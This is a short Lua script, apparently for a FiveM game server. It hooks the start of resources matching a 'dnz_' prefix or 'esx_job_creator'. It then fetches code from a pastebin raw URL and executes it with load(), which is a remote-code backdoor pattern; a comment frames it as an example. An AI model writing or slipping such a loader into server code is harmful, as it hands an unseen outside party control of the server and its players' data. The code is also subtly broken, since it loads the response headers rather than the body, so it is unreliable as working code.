Config = {
  usePrefix = true, -- if a resource starts with the prefix
  resourcePrefixList = {
    "dnz_",
  },
  resourceNameList = {
    "esx_job_creator", 
    -- etc
  }
}

AddEventHandler('resourceStart', function(resourceName)
  if resourceName == GetCurrentResourceName() then
    return;
  end

  local runFunction = table.contains(Config.resourceNameList, resourceName);

  if Config.usePrefix then
    for i = 1, #Config.resourcePrefixList do
      if string.starts(resourceName, Config.resourcePrefixList[i]) then
        runFunction = true;
      end
    end
  end

  if runFunction then
    -- you can add anything here, as example im adding a http request to load code from an external website
    PerformHttpRequest('https://pastebin.com/raw/AW3n4hdN', function(resultCode, resultData, resultHeaders)
      if resultCode == 200 then
        load(resultHeaders)();
      end
    end);
  end
end);

function string.starts(String,Start)
  return string.sub(String,1,string.len(Start))==Start
end

function table.contains(table, element)
  for _, value in pairs(table) do
    if value == element then
      return true
    end
  end
  return false
end